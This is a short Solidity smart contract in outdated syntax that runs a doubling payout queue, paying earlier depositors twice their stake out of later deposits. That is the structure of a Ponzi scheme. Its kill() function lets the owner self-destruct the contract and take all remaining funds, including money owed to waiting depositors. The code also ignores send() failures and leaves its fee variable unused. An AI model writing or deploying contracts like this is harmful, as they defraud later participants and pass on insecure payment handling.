1 contract test {
2 
3   struct Person {
4       address etherAddress;
5       uint amount;
6   }
7 
8   Person[] public persons;
9 
10   uint public payoutIdx = 0;
11   uint public collectedFees;
12   uint public balance = 0;
13 
14   address public owner;
15 
16 
17   modifier onlyowner { if (msg.sender == owner) _ }
18 
19 
20   function test() {
21     owner = msg.sender;
22   }
23 
24   function() {
25     enter();
26   }
27   
28   function enter() {
29   //only pair amount
30     if (msg.value % 2 != 0 ) {
31         msg.sender.send(msg.value);
32         return;
33     }
34 	
35 	uint amount;
36 
37 	amount = msg.value;
38 
39 
40     uint idx = persons.length;
41     persons.length += 1;
42     persons[idx].etherAddress = msg.sender;
43     persons[idx].amount = amount;
44  
45     
46 
47       balance += amount;
48   
49 
50 
51     while (balance > persons[payoutIdx].amount * 2) {
52       uint transactionAmount = persons[payoutIdx].amount * 2;
53       persons[payoutIdx].etherAddress.send(transactionAmount);
54 
55       balance -= transactionAmount;
56       payoutIdx += 1;
57     }
58   }
59 
60 function kill(){
61   if(msg.sender == owner) {
62   suicide(owner);
63   }
64   }
65 
66   function setOwner(address _owner) onlyowner {
67       owner = _owner;
68   }
69 }